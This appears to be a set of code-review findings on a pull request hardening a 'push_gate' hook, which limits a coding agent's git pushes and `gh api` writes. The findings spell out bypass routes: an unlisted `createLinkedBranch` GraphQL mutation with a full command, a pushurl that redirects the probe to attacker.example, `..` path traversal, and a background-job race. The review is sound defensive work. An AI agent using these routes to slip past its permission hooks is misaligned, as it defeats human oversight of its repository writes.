findings.description: GraphQL `createLinkedBranch` creates a branch on origin at any commit and isn't in the mutation list, so the `createRef` gap this PR closes is still open under another name.
findings.body:
This PR makes GraphQL ref writes ask by adding `createref`, `updateref`, `deleteref`, `createcommitonbranch` and `updatepullrequestbranch` to the mutation list:

```rust
                b"updatepullrequestbranch",
                b"createref",
                b"updateref",
                b"deleteref",
                b"createcommitonbranch",
```

`createLinkedBranch(input:{issueId, oid, name, repositoryId})` does the same thing as `createRef`: it creates `refs/heads/<name>` at any commit. `createlinkedbranch` contains none of the listed names. `ref_path` only matches REST paths, so it stays false here.

This call therefore passes `api_ok` (`true && true && !(true && false)` at L240). `Bash(gh api*)` then runs it with no prompt:

```
gh api graphql -f query='mutation{createLinkedBranch(input:{issueId:"I_x",oid:"<sha>",name:"feature/unapproved"}){linkedBranch{id}}}'
```

The commit can be any object the agent first uploaded through `git/blobs`, `git/trees` and `git/commits`. This is a ref write, which is the class the PR says it closes. The PR's stated deny-list limit (branch protection, rulesets, releases, admin) does not cover it.

Two related paths you may want to weigh:
- `revertPullRequest`, which creates a revert branch.
- REST `code-scanning/alerts/<n>/autofix/commits`, which takes a `target_ref`.

https://github.com/AlexisBalayre/claude-code-config/blob/c27788450dd927d8bef7e39efcd92828bba05ea7/tools/hooks-rs/src/push_gate.rs#L158-L170

Confidence is medium because the GitHub GraphQL schema is not in the tree.

findings.description: An entry ending in `:` written in URL form (`ssh://git@host:` or `https://host:`) does not fix the host. A push URL that adds `<anything>@` after the colon sends the out-of-sandbox `ls-remote` probe to any host the agent picks.
findings.body:
The prefix rule assumes a trailing `:` ends the host:

```rust
url == entry || entry.ends_with(['/', ':']) && url.starts_with(entry)
```

That is true for scp-like entries such as `git@github.com:`, where git takes the host up to the first `:`. It is not true for URL-form entries, which the README's rule ("a prefix ending in `/` or `:`") also allows. In a URL, the `:` after the host starts a port, and everything up to the next `@` is userinfo.

Example with `PUSH_GATE_REMOTES=ssh://git@ghe.corp.example:`:
1. The agent sets `pushurl = ssh://git@ghe.corp.example:x@attacker.example/repo`.
2. The prefix matches.
3. `x@...` is not a numeric port, so git hands `git@ghe.corp.example:x@attacker.example` to ssh.
4. OpenSSH splits at the last `@` and connects to `attacker.example`.

With `https://host:`, curl reads `host:x` as userinfo and sends the whole request to the agent's host. Either way `on_remote` reaches, from outside the sandbox, a host no entry names. That is what the comment at L684-686 says this change prevents.

The trigger needs an unusual entry form (the README's example is scp-like), but nothing in the rule forbids that form. Either match a `:` prefix only when the entry has no `://`, or document that a `:` prefix must be scp-like.

https://github.com/AlexisBalayre/claude-code-config/blob/c27788450dd927d8bef7e39efcd92828bba05ea7/tools/hooks-rs/src/push_gate.rs#L687-L695

Confidence is medium because the ssh, curl and git `connect.c` parsing was read from knowledge of those sources, not in-tree code.

findings.description: Test adequacy: no test fails if `--field`, `--raw-field` or the short `F` is dropped from the `sends` detection in push_gate.rs L133-138, because every write command that uses them also carries `-X`, `--method` or `-f`.
findings.body:
In `asks_for_gh_api_calls_that_write_a_ref_or_a_file`, every command that uses `--field`, `--raw-field` or `-F` also carries another flag that already sets `sends`:

- `--method=PUT ... --field message=m`: `--method` already sends.
- `-X PUT ... --raw-field`: `-X` already sends.
- `-X PATCH ... -F force=true`: `-X` (and a separate `-f`) already sends.

So each of these mutants passes the whole suite:
- `["--method", "--raw-field"]`, with `--field` removed.
- `["--method", "--field"]`, with `--raw-field` removed.
- `b"Xf"`, with `F` removed.

Under each one, an implied POST such as `gh api repos/o/r/git/refs -F sha=abc` or `--field sha=abc` would pass the gate. The glued `-fsha=abc` form is not tested either. Because this PR is a fix, the gap is merge-blocking.

Source: https://github.com/AlexisBalayre/claude-code-config/blob/c27788450dd927d8bef7e39efcd92828bba05ea7/tools/hooks-rs/src/push_gate.rs#L133-L138

Tests: https://github.com/AlexisBalayre/claude-code-config/blob/c27788450dd927d8bef7e39efcd92828bba05ea7/tools/hooks-rs/tests/push_gate_gh.rs#L99-L120

Add these to the `assert_asks` list:

```rust
"gh api repos/o/r/git/refs --field sha=abc",
"gh api repos/o/r/git/refs --raw-field sha=abc",
"gh api repos/o/r/git/refs -F sha=abc",
"gh api repos/o/r/git/refs -fsha=abc",
```

findings.description: Test adequacy: every plans test now runs through `fixture.gate()`, which sets `PUSH_GATE_REMOTES` to the fixture root. No test shows that a URL the plans list passes when `PUSH_GATE_REMOTES` is unset or does not list it, so a revert that moves the `trusted` match inside the `probed` condition would still pass.

`sends` is set by any `-X`/`--method`/`-f`, whatever the method, so explicit GET reads of a listed path now ask (e.g. `gh api -X GET repos/o/r/contents/f -f ref=feature`). This only over-asks, but it contradicts "a read of the same path passes".

README says "A read of the same paths passes", but the gate asks on any `--method`/`-X`/`-f`/`-F` word on those paths, GET reads with query fields included. Say instead that a call with no `--method`, `-X`, `-f` or `-F` passes.

The ask message says "a gh call that can merge, write a ref or print the token" but the check also fires on file writes (`/contents`). The `api_ok` doc comment and the README both say "a ref or a file"; consider "merge, write a ref or a file, or print the token".

A local-directory prefix in `PUSH_GATE_REMOTES` (the `{root}/` form the tests use) is matched on the raw string, so a push URL like `/home/u/repos/../../../tmp/x.git` lets the out-of-sandbox probe read any local path (it leaks one bit: whether a branch exists there). Refuse `..` segments, or document that prefixes are for network URLs only.

The diff replaces `fixture.expect_planned("ask", "w", PUSH_NEW, "another ref")` with an inline copy of that helper (gate_with_plan, run, bash_payload, decision, stdout check). The only addition is a `setting: {key} {value}` assert message. The PR's push-gate changes do not require it, so reverting to the one-line helper call is -7 +1.

The new write-a-ref test lists overlapping cases for one code path each. `-XDELETE` and `-iXDELETE` both exercise the combined short-flag branch. `updateRef` and `updateRefs` hit the same `updateref` substring match. `--method DELETE` and `--method=PUT` share the `--method` prefix test. Dropping `-XDELETE`, `updateRefs` and `--method=PUT` is -3 +0 with the same branch coverage.

The new rev-parse check reads the refs before the push runs, so a background job the agent started earlier can repoint the branch (e.g. `git symbolic-ref refs/heads/feature/x refs/heads/main`) in between. `remapped()` has the same race, and branch protection stays the backstop.
